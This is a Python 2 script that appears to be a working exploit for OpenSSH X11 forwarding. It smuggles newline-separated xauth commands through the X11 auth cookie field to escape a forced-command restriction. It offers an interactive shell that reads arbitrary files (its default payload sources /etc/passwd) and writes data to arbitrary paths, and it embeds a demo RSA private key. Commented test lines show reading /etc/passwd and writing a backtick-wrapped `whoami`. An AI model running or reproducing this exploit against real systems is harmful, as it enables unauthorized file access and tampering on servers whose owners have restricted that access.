#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import logging
import StringIO
import sys
import os

LOGGER = logging.getLogger(__name__)
try:
    import paramiko
except ImportError, ie:
    logging.exception(ie)
    logging.warning("Please install python-paramiko: pip install paramiko / easy_install paramiko / <distro_pkgmgr> install python-paramiko")
    sys.exit(1)

class SSHX11fwdExploit(object):
    def __init__(self, hostname, username, password, port=22, timeout=0.5, 
                 pkey=None, pkey_pass=None):
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if pkey:
            pkey = paramiko.RSAKey.from_private_key(StringIO.StringIO(pkey),pkey_pass)
        self.ssh.connect(hostname=hostname, port=port, 
                         username=username, password=password, 
                         timeout=timeout, banner_timeout=timeout,
                         look_for_keys=False, pkey=pkey)

    def exploit(self, cmd="xxxx\n?\nsource /etc/passwd\n"):
        transport = self.ssh.get_transport()
        session = transport.open_session()
        LOGGER.debug("auth_cookie: %s"%repr(cmd))
        session.request_x11(auth_cookie=cmd)
        LOGGER.debug("dummy exec returned: %s"%session.exec_command(""))

        transport.accept(0.5)
        session.recv_exit_status()  # block until exit code is ready
        stdout, stderr = [],[]
        while session.recv_ready():
            stdout.append(session.recv(4096))
        while session.recv_stderr_ready():
            stderr.append(session.recv_stderr(4096))
        session.close()
        return ''.join(stdout)+''.join(stderr)              # catch stdout, stderr

    def exploit_fwd_readfile(self, path):
        data = self.exploit("xxxx\nsource %s\n"%path)
        if "unable to open file" in data:
            raise IOError(data)
        ret = []
        for line in data.split('\n'):
            st = line.split('unknown command "',1)
            if len(st)==2:
                ret.append(st[1].strip(' "'))
        return '\n'.join(ret)

    def exploit_fwd_write_(self, path, data):
        '''
        adds display with protocolname containing userdata. badchars=<space>
        '''
        dummy_dispname = "127.0.0.250:65500"
        ret = self.exploit('\nadd %s %s aa'%(dummy_dispname, data))
        if ret.count('bad "add" command line')>1:
            raise Exception("could not store data most likely due to bad chars (no spaces, quotes): %s"%repr(data))
        LOGGER.debug(self.exploit('\nextract %s %s'%(path,dummy_dispname)))
        return path

demo_authorized_keys = '''#PUBKEY line - force commands: only allow "whoami"
#cat /home/user/.ssh/authorized_keys
command="whoami" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1RpYKrvPkIzvAYfX/ZeU1UzLuCVWBgJUeN/wFRmj4XKl0Pr31I+7ToJnd7S9JTHkrGVDu+BToK0f2dCWLnegzLbblr9FQYSif9rHNW3BOkydUuqc8sRSf3M9oKPDCmD8GuGvn40dzdub+78seYqsSDoiPJaywTXp7G6EDcb9N55341o3MpHeNUuuZeiFz12nnuNgE8tknk1KiOx3bsuN1aer8+iTHC+RA6s4+SFOd77sZG2xTrydblr32MxJvhumCqxSwhjQgiwpzWd/NTGie9xeaH5EBIh98sLMDQ51DIntSs+FMvDx1U4rZ73OwliU5hQDobeufOr2w2ap7td15 user@box
'''
PRIVKEY = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAtUaWCq7z5CM7wGH1/2XlNVMy7glVgYCVHjf8BUZo+FypdD69
9SPu06CZ3e0vSUx5KxlQ7vgU6CtH9nQli53oMy225a/RUGEon/axzVtwTpMnVLqn
PLEUn9zPaCjwwpg/Brhr5+NHc3bm/u/LHmKrEg6IjyWssE16exuhA3G/Teed+NaN
zKR3jVLrmXohc9dp57jYBPLZJ5NSojsd27LjdWnq/PokxwvkQOrOPkhTne+7GRts
U68nW5a99jMSb4bpgqsUsIY0IIsKc1nfzUxonvcXmh+RASIffLCzA0OdQyJ7UrPh
TLw8dVOK2e9zsJYlOYUA6G3rnzq9sNmqe7XdeQIDAQABAoIBAHu5M4sTIc8h5RRH
SBkKuMgOgwJISJ3c3uoDF/WZuudYhyeZ8xivb7/tK1d3HQEQOtsZqk2P8OUNNU6W
s1F5cxQLLXvS5i/QQGP9ghlBQYO/l+aShrY7vnHlyYGz/68xLkMt+CgKzaeXDc4O
aDnS6iOm27mn4xdpqiEAGIM7TXCjcPSQ4l8YPxaj84rHBcD4w033Sdzc7i73UUne
euQL7bBz5xNibOIFPY3h4q6fbw4bJtPBzAB8c7/qYhJ5P3czGxtqhSqQRogK8T6T
A7fGezF90krTGOAz5zJGV+F7+q0L9pIR+uOg+OBFBBmgM5sKRNl8pyrBq/957JaA
rhSB0QECgYEA1604IXr4CzAa7tKj+FqNdNJI6jEfp99EE8OIHUExTs57SaouSjhe
DDpBRSTX96+EpRnUSbJFnXZn1S9cZfT8i80kSoM1xvHgjwMNqhBTo+sYWVQrfBmj
bDVVbTozREaMQezgHl+Tn6G1OuDz5nEnu+7gm1Ud07BFLqi8Ssbhu2kCgYEA1yrc
KPIAIVPZfALngqT6fpX6P7zHWdOO/Uw+PoDCJtI2qljpXHXrcI4ZlOjBp1fcpBC9
2Q0TNUfra8m3LGbWfqM23gTaqLmVSZSmcM8OVuKuJ38wcMcNG+7DevGYuELXbOgY
nimhjY+3+SXFWIHAtkJKAwZbPO7p857nMcbBH5ECgYBnCdx9MlB6l9rmKkAoEKrw
Gt629A0ZmHLftlS7FUBHVCJWiTVgRBm6YcJ5FCcRsAsBDZv8MW1M0xq8IMpV83sM
F0+1QYZZq4kLCfxnOTGcaF7TnoC/40fOFJThgCKqBcJQZKiWGjde1lTM8lfTyk+f
W3p2+20qi1Yh+n8qgmWpsQKBgQCESNF6Su5Rjx+S4qY65/spgEOOlB1r2Gl8yTcr
bjXvcCYzrN4r/kN1u6d2qXMF0zrPk4tkumkoxMK0ThvTrJYK3YWKEinsucxSpJV/
nY0PVeYEWmoJrBcfKTf9ijN+dXnEdx1LgATW55kQEGy38W3tn+uo2GuXlrs3EGbL
b4qkQQKBgF2XUv9umKYiwwhBPneEhTplQgDcVpWdxkO4sZdzww+y4SHifxVRzNmX
Ao8bTPte9nDf+PhgPiWIktaBARZVM2C2yrKHETDqCfme5WQKzC8c9vSf91DSJ4aV
pryt5Ae9gUOCx+d7W2EU7RIn9p6YDopZSeDuU395nxisfyR1bjlv
-----END RSA PRIVATE KEY-----"""


if __name__=="__main__":
    logging.basicConfig(loglevel=logging.DEBUG)
    LOGGER.setLevel(logging.DEBUG)

    if not len(sys.argv)>4:
        print """ Usage: <host> <port> <username> <password or path_to_privkey>
        path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key
"""
        sys.exit(1)
    hostname, port, username, password = sys.argv[1:]
    port = int(port)
    pkey = None
    if os.path.isfile(password):
        password = None
        with open(password,'r') as f:
            pkey = f.read()
    elif password==".demoprivkey":
        pkey = PRIVKEY
        password = None
        LOGGER.info("add this line to your authorized_keys file: \n%s"%demo_authorized_keys)

    LOGGER.info("connecting to: %s:%s@%s:%s"%(username,password if not pkey else "<PKEY>", hostname, port))
    ex = SSHX11fwdExploit(hostname, port=port,
                          username=username, password=password,
                          pkey=pkey,
                          timeout=10
                          )
    LOGGER.info("connected!")
    LOGGER.info ("""
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>
""")
    while True:
        cmd = raw_input("#> ").strip()
        if cmd.lower().startswith(".exit") or cmd.lower().startswith(".quit"):
            break
        elif cmd.lower().startswith(".info"):
            LOGGER.info(ex.exploit("\ninfo"))
        elif cmd.lower().startswith(".readfile"): 
            LOGGER.info(ex.exploit_fwd_readfile(cmd.split(" ",1)[1]))
        elif cmd.lower().startswith(".writefile"):
            parts = cmd.split(" ")
            LOGGER.info(ex.exploit_fwd_write_(parts[1],' '.join(parts[2:])))
        else:
            LOGGER.info(ex.exploit('\n%s'%cmd))

    # just playing around   
    #print ex.exploit_fwd_readfile("/etc/passwd")
    #print ex.exploit("\ninfo")
    #print ex.exploit("\ngenerate <ip>:600<port> .")                # generate <ip>:port  port=port+6000
    #print ex.exploit("\nlist")
    #print ex.exploit("\nnlist")
    #print ex.exploit('\nadd xx xx "\n')
    #print ex.exploit('\ngenerate :0 . data "')
    #print ex.exploit('\n?\n')
    #print ex.exploit_fwd_readfile("/etc/passwd")
    #print ex.exploit_fwd_write_("/tmp/somefile", data="`whoami`")
    LOGGER.info("--quit--")
